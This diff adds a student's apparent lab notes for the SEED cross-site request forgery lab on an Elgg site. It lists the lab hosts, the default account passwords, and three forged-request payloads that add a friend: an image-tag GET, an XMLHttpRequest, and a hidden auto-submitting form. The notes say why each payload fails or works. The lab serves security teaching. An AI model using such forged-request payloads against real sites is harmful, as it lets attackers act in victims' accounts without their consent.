@@ -1,0 +1,93 @@
+* Lab Setup
+
+Configure the /etc/hosts file to 
+
+10.9.0.5 www.seed-server.com
+10.9.0.5 www.example32.com
+10.9.0.105 www.attacker32.com
+
+** Credentials
+|----------+-------------|
+| Username | Password    |
+|----------+-------------|
+| admin    | seedelgg    |
+|----------+-------------|
+| alice    | seedalice   |
+|----------+-------------|
+| boby     | seedboby    |
+|----------+-------------|
+| charlie  | seedcharlie |
+|----------+-------------|
+| samy     | seedsamy    |
+|----------+-------------|
+
+
+* Task 1
+** Approach 1
+*** Inject malicious link in the image source
+#+BEGIN_SRC html
+  <html>
+    <body>
+      <h1>This page forges an HTTP GET request</h1>
+      <img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
+    </body>
+  </html>
+#+END_SRC
+
+Inserting malicious link in HTTP image tag doesn't work anymore, because of CORB (Cross Origin Read Blocking)
+which can ~identify and block dubious cross origin resource loads~ before they even reach the webpage.
+
+** Approach 2
+*** Inject malicious javascript with XMLHttpRequest
+#+BEGIN_SRC javascript
+  <script>
+      window.onload=function(){
+          var sendurl="http://www.seed-server.com/action/friends/add?friend=59";
+          var Ajax=new XMLHttpRequest();
+          Ajax.open("GET", sendurl, true);
+          Ajax.send();
+      }
+  </script>
+#+END_SRC
+Why doesn't the AJAX request from cross origin doesn't work where as form requests from different site works?
+
+** Approach 3
+Send data as form requests from attackers site
+#+BEGIN_SRC javascript
+  <script type="text/javascript">
+      function forge_post(){
+          var fields;
+
+          // The following are form entries need to be filled out by attackers.
+          // The entries are made hidden, so the victim won't be able to see them.
+          fields += "<input type='hidden' name='friend' value='59'>";
+
+          // Create a <form> element.
+          var p = document.createElement("form");
+
+          // Construct the form
+          p.action = "http://www.seed-server.com/action/friends/add";
+          p.innerHTML = fields;
+          p.method = "get";
+
+          // Append the form to the current page.
+          document.body.appendChild(p);
+
+          // Submit the form
+          p.submit();
+      }
+
+      // Invoke forge_post() after the page is loaded.
+      window.onload = function() { forge_post();}
+  </script>
+#+END_SRC
+** Screenshot
+
+[[./screenshots/task-1.png]]
+
+
+
+
+
+* Task 2
+
